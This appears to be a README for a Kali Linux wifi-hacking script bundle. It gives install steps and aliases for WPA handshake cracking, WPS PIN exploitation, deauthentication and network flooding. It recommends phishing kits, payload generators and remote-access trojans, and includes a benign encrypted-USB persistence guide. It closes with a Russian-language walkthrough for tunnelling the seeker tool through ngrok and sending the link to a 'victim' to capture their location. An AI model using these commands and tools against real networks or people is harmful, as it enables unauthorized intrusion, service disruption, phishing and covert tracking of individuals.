-= W0ut =- 

WHY IS IT ALL?
    building scripts for easy and automatic use of hacking wifi and a little more 

HOW TO INSTALL
    ~# cd Wout
    ~# dos2unix install.sh
    ~# chmod +x install.sh
    ~# ./install.sh

WHERE IS EVERYTHING UNPACKING
    Results Folder...............................:/${USER}/MyOUTPUT/"
    Folder with setting..........................:/${USER}/MyScript/setting"
    Folder with my scripts.......................:/${USER}/MyScript/"
    Folder with all dictionaries.................:/${USER}/MyScript/dic/one/"
    File with found Wifi passwords...............:/${USER}/MyOUTPUT/wifi/${RD}WIFI_PASS.txt"
    File to generate a dictionary with passwords.:/${USER}/MyScript/dic/${RD}pluspass.txt"

ADDED NEW ALIASES
    alias getpass='cd /${USER}/MyScript/wifi/get_pass/ && ./crack.sh'"      # automatic brute hashes of wifi by dictionary
    alias getpin='cd /${USER}/MyScript/wifi/get_pin/ && ./wash.sh'"         # automatic exploitation of the vulnerability of the WPS wifi using reaver and pixiewps
    alias gethash='cd /${USER}/MyScript/wifi/get_hash/ && ./get_hash.sh'"   # automatic collection of WPA handshake and cracking them according to the dictionary
    alias ikill='cd /${USER}/MyScript/wifi/kill_wifi/ && ./killwifi.sh'"    # automatic suppression of wifi and sending packets to disconnect
    alias hashcrack='cd /${USER}/MyScript/ && ./hashcrack.sh                # cracked your hash
    alias idos='cd /${USER}/MyScript/ && ./hpingAttack.sh'"                 # small automatic flooding on the network
    alias ichwl='cd /${USER}/MyScript/ && ./chinterface.sh'"                # just changes the name of your network interface
    alias pscpu='ps auxf | sort -nr -k 3 | grep'
    alias psmem='ps auxf | sort -nr -k 4 | grep'
    alias ping='ping -c 5'
    alias update='apt-get update && apt-get upgrade -y'
    alias iclear='apt-get autoremove && apt-get autoclean && apt-clean'
    alias inst='apt-get install'
    alias h='history'
    alias j='jobs -l'
    alias wifidump='stwl && clear && airodump-ng -i ${INFACE}'
    alias resbash=' . ~/.bashrc'
    alias imdk3='stwl && clear && mdk3 ${INFACE} d -c'
    alias iptab1='sysctl net.ipv4.ip_forward=1'
    alias iptab0='sysctl net.ipv4.ip_forward=0'
    alias end='shutdown'
    alias findip='geoiplookup'
    alias proxi='service tor start && proxychains'
    alias msf='service postgresql start && service apache2 start && msfconsole'

FILES HAVE BEEN CHANGED
    ~/.zshrc
    ~/.bashrc

EXAMPLE
    ./getpass.sh
    ./getpass.sh /home/wifi.cap

    ./hashcrack.sh
    ./hashcrack.sh /home/filehash.hash

RECOMMENDATION
==============================================
duf 
    git clone https://github.com/muesli/duf.git
        Disk Usage/Free Utility (Linux, BSD, macOS & Windows)

--------------------------
evillimiter
    git clone https://github.com/bitbrute/evillimiter.git
        Control the speed of the Internet connection in the network

--------------------------
Sn1per
    git clone https://github.com/1N3/Sn1per.git
        Sn1per Community Edition is an automated scanner that can be used during a penetration test to enumerate and scan for vulnerabilities

--------------------------
SocialPhish
    git clone https://github.com/xHak9x/SocialPhish.git
        This script uses some webpages generated by SocialFish Tool

--------------------------
cupp
    git clone https://github.com/Mebus/cupp.git
        The most common form of authentication is the combination of a username and a password or passphrase

--------------------------
seeker       
    git clone https://github.com/thewhiteh4t/seeker.git
        Concept behind Seeker is simple, just like we host phishing pages to get credentials why not host a fake page that requests your location like many popular location based websites

--------------------------
KitHack
    git clone https://github.com/AdrMXR/KitHack.git
        Kithack is a framework designed to automate the download and installation process of various penetration testing tools, with a special option that allows you to generate cross-platform loopholes using the Metasploit Framework.

--------------------------
ToRat
    git clone https://github.com/lu4p/ToRat.git
        A Cross Platform Remote Administration tool written in Go using Tor as its transport mechanism currently supporting Windows, Linux, MacOS clients.

--------------------------
paradoxiaRAT
    git clone https://github.com/quantumcored/paradoxiaRAT
        Paradoxia Remote Access Tool.


--- ✄ -----------------------

Создаем Encrypt persistence на Live usb Kali:
            - Encrypt the partition with LUKS:
                ☐ cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb3

            - Open the encrypted partition:
                ☐ cryptsetup luksOpen /dev/sdb3 my_usb

            - Create an ext3 filesystem and label it:
                ☐ mkfs.ext3 /dev/mapper/my_usb
                ☐ e2label /dev/mapper/my_usb persistence

            - Mount the partition and create your persistence.conf so changes persist across reboots:
                ☐ mkdir -p /mnt/my_usb
                ☐ mount /dev/mapper/my_usb /mnt/my_usb
                ☐ echo "/ union" > /mnt/my_usb/persistence.conf
                ☐ umount /dev/mapper/my_usb
                ☐ cryptsetup luksClose /dev/mapper/my_usb

        Создаем дополнительный не шифрованный раздел на Live USB Kali:

            - Format the fourth partition, label it "work".
                ☐ mkfs.ext3 /dev/sdb4
                ☐ e2label /dev/sdb4 work

            - Mount this new partition and create a persistence.conf in it:
                ☐ mkdir -p /mnt/usb
                ☐ mount /dev/sdb4 /mnt/usb
                ☐ echo "/ union" > /mnt/usb/persistence.conf
                ☐ umount /mnt/usb

 --- ✄ -----------------------
 
SEEKER, NGROK (Кидаем  ссылку жертве для определения его местоположения):
            Install ngrok:
                - download ngrok - https://ngrok.com/download
                - create account ngrok
                ☐ unzip /path/to/ngrok.zip
                ☐ ./ngrok authtoken <your_auth_token>
            Install seeker:
                ☐ git clone https://github.com/thewhiteh4t/seeker.git
                ☐ cd seeker/
                ☐ apt update
                ☐ apt install python3 python3-pip php
                ☐ pip3 install requests
            Запускаем:
                ☐ ./ngrok http 8080
                ☐ ./seeker.py -t manual
                    - полученную ссылку кидаем жертве, когда он переходи по ней, мы в терминале увидим полученные данные о нем
